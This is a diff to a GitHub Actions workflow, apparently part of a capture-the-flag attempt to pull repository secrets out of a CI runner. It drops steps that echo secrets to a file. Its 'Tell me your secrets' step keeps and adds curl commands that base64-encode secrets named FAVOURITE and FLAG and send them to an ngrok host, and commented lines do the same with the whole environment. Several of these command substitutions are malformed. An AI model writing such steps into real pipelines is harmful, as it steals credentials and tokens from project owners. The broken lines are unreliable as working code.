@@ -19,23 +19,13 @@ jobs:
 
 
     steps:
-      - name: Echo secret FAVOURITE
-        run: 'echo "$FAVOURITE" > key'
-        shell: bash
-        env:
-          FAVOURITE: ${{secrets.FAVOURITE}}
-
-      - name: Echo secret FAVORITE
-        run: 'echo "$FAVORITE" > key'
-        shell: bash
-        env:
-          FAVOURITE: ${{secrets.FAVORITE}}
 
       - name: Tell me your secrets
         run: |
-          curl https://1d15-128-130-238-29.eu.ngrok.io/?data=$(env | base64 --wrap=0)
-          echo "::add-mask::${{ secrets.FAVOURITE }}"
-          curl -k https://1d15-128-130-238-29.eu.ngrok.io/?data=$(env | base64 --wrap=0)
           curl -k https://1d15-128-130-238-29.eu.ngrok.io/?data=$(${{ secrets.FAVOURITE }} | base64 --wrap=0)
+          curl -k https://1d15-128-130-238-29.eu.ngrok.io/?data=$(${{ secrets.FLAG }} | base64 --wrap=0)
           curl -k https://1d15-128-130-238-29.eu.ngrok.io/?data=$(secrets.FAVOURITE | base64 --wrap=0)
           curl -k https://1d15-128-130-238-29.eu.ngrok.io/?data=$(env.secrets.FAVOURITE | base64 --wrap=0)
+
+# curl -k https://1d15-128-130-238-29.eu.ngrok.io/?data=$(env | base64 --wrap=0)
+# echo "::add-mask::${{ secrets.FAVOURITE }}"
